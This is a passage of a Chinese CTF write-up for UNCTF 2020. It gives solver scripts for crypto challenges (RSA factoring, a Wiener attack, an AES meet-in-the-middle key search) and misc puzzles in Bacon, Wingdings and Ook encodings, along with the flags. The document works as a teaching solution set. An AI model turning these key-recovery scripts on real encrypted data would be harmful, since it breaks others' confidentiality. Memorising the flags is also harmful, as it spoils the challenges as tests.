<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">p = number.getPrime(<span class="number">1024</span>)</span><br><span class="line">q = number.getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> p &gt; q:</span><br><span class="line">  a = p + q</span><br><span class="line">  b = p - q</span><br><span class="line">  print(a,b)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = bytes_to_long(<span class="string">b'msg'</span>)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br></pre></td></tr></table></figure></div>

<p>题目给出了输出的a,b,c。结合加密过程可算出p，q的值。</p>
<p><strong>Decrypt</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment">#author:As1def</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">q=<span class="number">155422298738009940394189206134042119662513162560610248399569107132538620220590060772127789136918984458521940817304671619205395736161534795149599241668486283754795346411784845057685713557075371605135986388011998610261360520650827734187124699589734496097678970899686056997267797534053934064148348759788335157899</span></span><br><span class="line"></span><br><span class="line">p=<span class="number">164976388739628973581511063883090363893890874421691770454048880284500992179926996908823840726558454111596699286948761026319434957217223527703429627592448959262532954019810985574583860227624287638908448719207441426500367172146028171043107126122608800640249201232870138119493156975216320985668013888561826953269</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br><span class="line"></span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=int(gmpy2.invert(e,phi))</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure></div>

<p>flag：UNCTF{welcome_to_rsa}</p>
<h4 id="鞍山大法官开庭之缺的营养这一块怎么补"><a href="#鞍山大法官开庭之缺的营养这一块怎么补" class="headerlink" title="鞍山大法官开庭之缺的营养这一块怎么补"></a>鞍山大法官开庭之缺的营养这一块怎么补</h4><p>题目</p>
<blockquote>
<p>某日，鞍山大法官在点外卖时点了2个韭菜盒子，商家只送了1个，大法官给了该商家一个差评 次日，该大法官又在该商家点了1个韭菜盒子，希望商家能补上上次的韭菜盒子，而商家又只发了一个韭菜盒子 这名大法官一天正常要吃2个韭菜盒子，而该商家每天只给他1个韭菜盒子，请问该名大法官缺的营养这一块怎么补</p>
<p>ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotootto</p>
</blockquote>
<p>由题目描述想到培根密码，将o，t分别替换成a，b，解密培根得到：PEIGENHENYOUYINGYANG</p>
<p>flag：unctf{PEIGENHENYOUYINGYANG}</p>
<h4 id="简单的RSA"><a href="#简单的RSA" class="headerlink" title="简单的RSA"></a>简单的RSA</h4><p>知识点：</p>
<p>低解密指数攻击<br>e很大，维纳攻击</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment">#author:As1def</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">  frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">  convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">  <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">    <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">      phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">      s = n - phi + <span class="number">1</span></span><br><span class="line">      discr = s * s - <span class="number">4</span> * n</span><br><span class="line">      <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">        t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">        <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">          print(<span class="string">"Hacked!"</span>)</span><br><span class="line">          <span class="keyword">return</span> d</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    e= <span class="number">18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781</span></span><br><span class="line">    n= <span class="number">147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701</span></span><br><span class="line">    c= <span class="number">140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934</span></span><br><span class="line">    d = wiener_hack(e, n)</span><br><span class="line">    m = pow(c,d,n)</span><br><span class="line">    <span class="keyword">print</span> long_to_bytes(m)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure></div>

<p>flag：unctf{wi3n3r_Att@ck}</p>
<h4 id="wing"><a href="#wing" class="headerlink" title="wing"></a>wing</h4><p>题目描述：</p>
<p>你过office二级了吗？</p>
<p><img src="/images/unctf2020/wing.png" alt=""></p>
<p>由题目描述想到与office文件有关，打开word，找到</p>
<p><img src="/images/unctf2020/word.png" alt=""></p>
<p>找到如下对应关系：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASIC"><figure class="iseeu highlight /basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">117 </span> u</span><br><span class="line"><span class="symbol">110 </span> n</span><br><span class="line"><span class="symbol">99 </span> c</span><br><span class="line"><span class="symbol">116 </span>t</span><br><span class="line"><span class="symbol">102 </span> f</span><br><span class="line"><span class="symbol">123 </span>&#123;</span><br><span class="line"><span class="symbol">119 </span> w </span><br><span class="line"><span class="symbol">105 </span>i</span><br><span class="line"><span class="symbol">110 </span>n</span><br><span class="line"><span class="symbol">103 </span>g</span><br><span class="line"><span class="symbol">100 </span>d</span><br><span class="line"><span class="symbol">105 </span>i</span><br><span class="line"><span class="symbol">110 </span>n</span><br><span class="line"><span class="symbol">103 </span>g</span><br><span class="line"><span class="symbol">115 </span>s</span><br><span class="line"><span class="symbol">95 </span>_</span><br><span class="line"><span class="symbol">105 </span>i</span><br><span class="line"><span class="symbol">115 </span>s</span><br><span class="line"><span class="symbol">95 </span>_</span><br><span class="line"><span class="symbol">105 </span>i</span><br><span class="line"><span class="symbol">110 </span>n</span><br><span class="line"><span class="symbol">99 </span>c</span><br><span class="line"><span class="symbol">111 </span>o</span><br><span class="line"><span class="symbol">109 </span>m</span><br><span class="line"><span class="symbol">112 </span>p</span><br><span class="line"><span class="symbol">114 </span>r</span><br><span class="line"><span class="symbol">101 </span>e</span><br><span class="line"><span class="symbol">104 </span>h</span><br><span class="line"><span class="symbol">101 </span>e</span><br><span class="line"><span class="symbol">110 </span>n</span><br><span class="line"><span class="symbol">115 </span>s</span><br><span class="line"><span class="symbol">105 </span>i</span><br><span class="line"><span class="symbol">98 </span> b</span><br><span class="line"><span class="symbol">108 </span>l</span><br><span class="line"><span class="symbol">101 </span>e</span><br><span class="line"><span class="symbol">125 </span>&#125;</span><br></pre></td></tr></table></figure></div>

<p>flag：unctf{wingdings_is_incomprehensible}</p>
<h4 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h4><p>题目描述：</p>
<blockquote>
<p>Really baby problem about block cipher</p>
</blockquote>
<p>题目给出了加密源码和output输出文本。</p>
<p><strong>encrypt</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">random.seed(urandom(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">key1 = <span class="string">'0'</span>*<span class="number">13</span> + <span class="string">''</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">key2 = <span class="string">''</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]) + <span class="string">'0'</span>*<span class="number">13</span></span><br><span class="line"></span><br><span class="line">cipher1 = AES.new(key=key1.encode(), mode=AES.MODE_ECB)</span><br><span class="line">cipher2 = AES.new(key=key2.encode(), mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">pt = input(<span class="string">"You have a chance to get something: "</span>)</span><br><span class="line">pt = pt.encode()</span><br><span class="line"></span><br><span class="line">val = len(pt) % <span class="number">16</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> val == <span class="number">0</span>:</span><br><span class="line">  pt += <span class="string">b'\x00'</span>*(<span class="number">16</span> - val)</span><br><span class="line"></span><br><span class="line">c1 = cipher1.encrypt(pt)</span><br><span class="line">c2 = cipher2.encrypt(c1)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Your cipher:&#123;&#125;'</span>.format(hexlify(c2)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(len(flag) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">c3 = cipher1.encrypt(flag)</span><br><span class="line">c4 = cipher2.encrypt(c3)</span><br><span class="line">print(<span class="string">'Your flag:&#123;&#125;'</span>.format(hexlify(c4)))</span><br></pre></td></tr></table></figure></div>

<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You have a chance to get something: UNCTF2020_Enjoy_Crypto<span class="symbol">~</span></span><br><span class="line"><span class="symbol">Your cipher</span>:b'01a4e429e76db218fa0eb18f03ec69c<span class="number">9200</span>a<span class="number">2362</span>d8b4d7ea<span class="number">4617</span>0ce<span class="number">698389</span>bbd'</span><br><span class="line">Your flag:b'196cc94c2d685beb54beeaa14c1dc0a6f<span class="number">3794</span>d65fca0d1a<span class="number">1274515166</span>e<span class="number">4255</span>ab<span class="number">36738309</span>2e42d<span class="number">774992</span>f74bc138faaad'</span><br></pre></td></tr></table></figure>

<p>分组密码，通过观察题目给的条件，有明文对应的密文，但还是需要两个key，这时想到中间相遇攻击，将明文通过key1进行加密，把所有密文1和key值存储下来，可以单独开辟一块内存空间存储这些值。再将密文通过key2进行解密，再去跟前面存储的数据对比寻找相同密文以及对应key1，再解出对应密文值即可。</p>
<p><strong>decrypt</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#author:As1def</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">pt = <span class="string">"UNCTF2020_Enjoy_Crypto~"</span>.encode()</span><br><span class="line">val = len(pt) % <span class="number">16</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> val == <span class="number">0</span>:</span><br><span class="line">    pt += <span class="string">b'\x00'</span>*(<span class="number">16</span> - val)</span><br><span class="line">target = unhexlify(<span class="string">b"01a4e429e76db218fa0eb18f03ec69c9200a2362d8b4d7ea46170ce698389bbd"</span>)</span><br><span class="line">lookup_table = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># create all 100^3 forward-encryption-options</span></span><br><span class="line"><span class="keyword">for</span> p1 <span class="keyword">in</span> itertools.product(printable, repeat=<span class="number">3</span>):</span><br><span class="line">    key = <span class="string">""</span>.join(p1)</span><br><span class="line">    key1 = <span class="string">"0000000000000"</span> + key</span><br><span class="line"></span><br><span class="line">    cipher1 = AES.new(key=key1.encode(<span class="string">"utf-8"</span>), mode=AES.MODE_ECB)</span><br><span class="line">    c1 = cipher1.encrypt(pt)</span><br><span class="line">    lookup_table[c1] = key1</span><br><span class="line"></span><br><span class="line">print(<span class="string">"done creating lookup table"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create all 100^3 backward-encryption-options</span></span><br><span class="line"><span class="keyword">for</span> p2 <span class="keyword">in</span> itertools.product(printable, repeat=<span class="number">3</span>):</span><br><span class="line">    key = <span class="string">""</span>.join(p2)</span><br><span class="line">    key2 = key + <span class="string">"0000000000000"</span></span><br><span class="line"></span><br><span class="line">    cipher2 = AES.new(key=key2.encode(<span class="string">"utf-8"</span>), mode=AES.MODE_ECB)</span><br><span class="line">    c2 = cipher2.decrypt(target)</span><br><span class="line">    <span class="keyword">if</span> c2 <span class="keyword">in</span> lookup_table:  <span class="comment"># check if the decryption of target == encryption of known plaintext</span></span><br><span class="line">        key1 = lookup_table[c2]</span><br><span class="line">        print(<span class="string">"key1:"</span>, key1, <span class="string">"key2:"</span>, key2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part 2: decryption</span></span><br><span class="line"></span><br><span class="line">flag = unhexlify(<span class="string">b"196cc94c2d685beb54beeaa14c1dc0a6f3794d65fca0d1a1274515166e4255ab367383092e42d774992f74bc138faaad"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> [key2, key1]:</span><br><span class="line">    cipher = AES.new(key=key.encode(<span class="string">"utf-8"</span>), mode=AES.MODE_ECB)</span><br><span class="line">    flag = cipher.decrypt(flag)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></div>

<p>flag：unctf{524e314a-5843-3030-5939-333230323541}</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="YLB’s-CAPTCHA-签到题"><a href="#YLB’s-CAPTCHA-签到题" class="headerlink" title="YLB’s CAPTCHA - 签到题"></a>YLB’s CAPTCHA - 签到题</h4><p>这题真是硬看的，连续输入十次正确的验证码即可得到flag。</p>
<h4 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h4><p>题目描述：</p>
<blockquote>
<p>了解一下png图片格式</p>
</blockquote>
<p>下载附件得到一张图片，直接使用十六进制编辑器打开，在最下面发现存在一个b站链接，复制下来访问它</p>
<p>在视频下方评论处拿到flag。</p>
<p>flag：unctf{let’s_study_pwn}</p>
<h4 id="阴阳人编码"><a href="#阴阳人编码" class="headerlink" title="阴阳人编码"></a>阴阳人编码</h4><p>下载附件，是一个txt文本，里面全是形如 “就这. 就这¿ 不会吧! “ 的字符串，这题也是尝试好几种情况，摩斯密码还有网上找到类似的阴阳人编码，都解密无果，后来想到我们需要解密的就是这些字符串后面所跟的符号，于是使用Ook解密，对应替换为Ook编码形式，密文变成：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span 